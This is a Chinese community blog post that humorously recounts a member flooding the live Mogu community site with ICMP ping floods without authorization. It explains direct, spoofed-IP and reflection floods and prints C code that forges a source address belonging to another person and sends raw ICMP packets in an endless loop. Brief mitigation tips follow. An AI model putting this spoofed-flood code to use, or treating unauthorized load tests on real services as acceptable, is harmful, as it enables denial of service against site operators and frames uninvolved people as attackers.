大家好，我是**陌溪**。

最近群里小伙伴学习了一些安全相关的知识，准备拿着**蘑菇社区**来测试，差点把蘑菇搞宕机了，下面让我们一起看看群友 **W** 对**蘑菇**做了些什么吧~

因为没有得到**陌溪**授权，所以无法对蘑菇博客进行渗透测试，毕竟 **W** 是**遵纪守法**的。

这时群友提出了通过 **ping** 的方式来进行攻击，而 **W** 恰好是一个修网的网工转的安全，所以简单跟大家聊一下这种攻击方法。

一般，比较常见的攻击手段是 **ping** 泛洪攻击，也叫 **ICMP** 洪水攻击是 **DOS** 攻击的一种。其目的是耗尽受害者的带宽，以至于合法的流量不能通过。攻击者向受害者发送许多很大的 **ping** 数据包，消耗受害者网络连接的带宽。

**ping** 命令的简单了解：**echo request** 回响请求（Type=8 code=0）和 **echo reply** 回响应答（Type=0 code=0）。

下面举个栗子：

当我向蘑菇社区发送一个 **Type=8** 的 **ICMP** 报文，蘑菇社区会返回一个 **Type=0** 的 **ICMP** 报文来证明自己的存在。

小白常用的方式是直接使用 **DOS** 窗口进行 **ping x.x.x.x -l 65500 -t**，此时我们要知道 **ping** 使用的是 **ECHO** 应答，返回的速度很慢 **1-5包/秒** ；

但是 **ICMP** 是 **SOCK\_RAW** 产生的原始报文，在这部分不会有延迟问题，所以延迟的主要来源是计算 **ECHO** 时间.

经 **W** 不辞辛苦的查阅及抓包分析发现是 **icmp.dll** 提供的 **IcmpSendEcho** 这个 **API** 的问题。

**测试阶段**
-------

前提：足够快的数据包发送速度和足够的带宽，下面我们来讲解一下各个攻击方式介绍：

### 直接洪水攻击 >>W采用的方式

 需要一台比蘑菇社区服务器带宽更高的主机，采用多线程的方法一次性发送多个 **ICMP** 请求报文，让目的主机忙于处理大量这些报文而造成速度缓慢甚至宕机。

缺点：陌溪发现了无聊群友的企图，受到攻击后根据 **ICMP** 包的IP地址而屏蔽掉攻击源，使得无聊群友的快乐消失。

### 伪IP攻击

见名知意，就是伪装成群里另外一个小伙伴：**遇见geigei** 的 **ip** 地址，进行挑拨离间。

**图：W主机>>>>>>>>>>蘑菇博客>>>>>>>>>>>>遇见geigei**

           ping伪装ip为x.x.x.x                       pong  pong将报文发送给遇见geigei

### 反射攻击

让一群背锅侠误以为蘑菇社区在向他们发送 **ICMP** 请求包，然后背锅侠向蘑菇社区发送 **ICMP** 应答包，造成来自四面八方的洪水淹没蘑菇社区的现象。这种攻击非常隐蔽，因为受害主机很难查出攻击源是谁。

 **图：W主机>>>>>>>>>>遇见geigei>>>>>>>>>>>>蘑菇社区（截获攻击者IP=遇见geigei）**

准备工具：此处 **W** 利用的公司的内部工具，因为保密协议原因所以向大家展示了其他人的攻击工具，为了确保蘑菇社区的安全性，工具的最终架构线程发包部分没有挂上来，还请大家谅解

    void DoS_icmp_pack(char* packet)
    {
        struct ip* ip_hdr = (struct ip*)packet;
        struct icmp* icmp_hdr = (struct icmp*)(packet + sizeof(struct ip));
    
        ip_hdr->ip_v = 4;
        ip_hdr->ip_hl = 5;
        ip_hdr->ip_tos = 0;
        ip_hdr->ip_len = htons(ICMP_PACKET_SIZE);
        ip_hdr->ip_id = htons(getpid());
        ip_hdr->ip_off = 0;
        ip_hdr->ip_ttl = 64;
        ip_hdr->ip_p = PROTO_ICMP;
        ip_hdr->ip_sum = 0;
        ip_hdr->ip_src.s_addr = inet_addr(FAKE_IP);; //伪装为遇见geigei的ip地址
        ip_hdr->ip_dst.s_addr = dest;  //填入蘑菇社区主机地址
    
        icmp_hdr->icmp_type = ICMP_ECHO;
        icmp_hdr->icmp_code = 0;
        icmp_hdr->icmp_cksum = htons(~(ICMP_ECHO << 8));
    }
    void Dos_Attack()
    {
        char* packet = (char*)malloc(ICMP_PACKET_SIZE);
        memset(packet, 0, ICMP_PACKET_SIZE);
        struct sockaddr_in to;
        DoS_icmp_pack(packet);
    
        to.sin_family = AF_INET;
        to.sin_addr.s_addr = dest;
        to.sin_port = htons(0);
        while(alive)  
        {
            sendto(rawsock, packet, ICMP_PACKET_SIZE, 0, (struct sockaddr*)&to, sizeof(struct sockaddr));        
        }
    
        free(packet); 
    }
    void Dos_Sig()
    {
        alive = 0;
        printf("stop DoS Attack!\n");
    }

##  测试结果

因为W测试的时候是在公司的原因，所以用了W手机的个人热点进行测试，当峰值达到3.3MB时W的电脑进入蘑菇社区时开始出现宕机卡顿现象

此时有蘑菇和W电脑自身问题的两种可能性， 所以需要陌溪授权后利用足够的带宽重新测试。

预防手段：

为了防止无聊群友的出现，所以可以采取限制

###  **方法一：限制**

            设置安全策略，在无聊群友多次ping之后，限制大小与次数

### 方法二：禁ping

            部分插件与监测功能会受到影响，所以此处不建议这种方法

### 方法三：过滤

            通过策略来过滤IP进行防范，此方法在无聊群友不伪装IP时非常有效

### 方法四：等等

因为防范的方法太多，而且W也要去学习java了，所以不逐个列举了

最后吐槽一下点我看图，用户在无法访问蘑菇社区时，看到一个张牙舞爪的七旬老伯跳舞心情又要-100，此处W建议将其换成年轻靓丽的妹子。